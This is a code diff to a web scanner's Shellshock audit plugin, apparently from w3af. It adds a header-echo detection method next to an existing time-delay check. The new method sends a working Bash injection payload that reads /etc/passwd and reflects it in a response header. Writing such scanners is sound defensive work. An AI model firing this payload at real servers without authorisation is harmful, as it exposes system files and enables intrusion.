@@ -73,24 +73,73 @@ class shell_shock(AuditPlugin):
         if url not in self.already_tested_urls:
             self.already_tested_urls.add(url)
 
-            # We are implementing time delays for detecting shell shock vulns
-            # pull-requests are welcome for detecting using other methods
-            self._with_time_delay(freq)
+            # We are implementing these methods for detecting shell-shock vulns
+            # if you know about other methods, or have improvements on these
+            # please let us know. Pull-requests are also welcome.
+            DETECTION_METHODS = [self._with_header_echo_injection,
+                                 #self._with_body_echo_injection,
+                                 self._with_time_delay]
+            for detection_method in DETECTION_METHODS:
+                if detection_method(freq):
+                    break
 
-    def _with_time_delay(self, freq):
+    def _with_header_echo_injection(self, freq):
         """
-        Tests an URLs for shell shock vulnerabilities using time delays.
+        We're sending a payload that will trigger the injection of various
+        headers in the HTTP response body.
 
         :param freq: A FuzzableRequest
+        :return: True if a vulnerability was found
         """
+        injected_header = 'ShellShock'
+        payload = '() { :;}; echo "%s: " $(</etc/passwd)' % injected_header
+
+        mutant = self.create_mutant(freq, TEST_HEADER)
+        mutant.set_token_value(payload)
+
+        response = self._uri_opener.send_mutant(mutant)
+        headers = response.get_lower_case_headers()
+
+        if injected_header.lower() in headers:
+            desc = 'Shell shock was found at: %s' % mutant.found_at()
+
+            v = Vuln.from_mutant('Shell shock vulnerability', desc,
+                                 severity.HIGH, [response.id],
+                                 self.get_name(), mutant)
+
+            self.kb_append_uniq(self, 'shell_shock', v)
+            return True
+
+    def _with_body_echo_injection(self, freq):
+        """
+        We're sending a payload that will trigger the injection of new lines
+        that will make the response transition from "headers" to "body".
+
+        :param freq: A FuzzableRequest
+        :return: True if a vulnerability was found
+        """
+        raise NotImplementedError
+
+    def create_mutant(self, freq, header_name):
         headers = freq.get_headers()
-        headers[TEST_HEADER] = ''
+        headers[header_name] = ''
         freq.set_headers(headers)
 
         fuzzer_config = {'fuzzable_headers': [TEST_HEADER]}
 
         mutant = HeadersMutant.create_mutants(freq, [''], [TEST_HEADER],
                                               False, fuzzer_config)[0]
+
+        return mutant
+
+    def _with_time_delay(self, freq):
+        """
+        Tests an URLs for shell shock vulnerabilities using time delays.
+
+        :param freq: A FuzzableRequest
+        :return: True if a vulnerability was found
+        """
+        mutant = self.create_mutant(freq, TEST_HEADER)
 
         for delay_obj in self.DELAY_TESTS:
             ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
@@ -105,7 +154,7 @@ class shell_shock(AuditPlugin):
                                      self.get_name(), mutant)
 
                 self.kb_append_uniq(self, 'shell_shock', v)
-                break
+                return True
 
     def get_long_desc(self):
         """
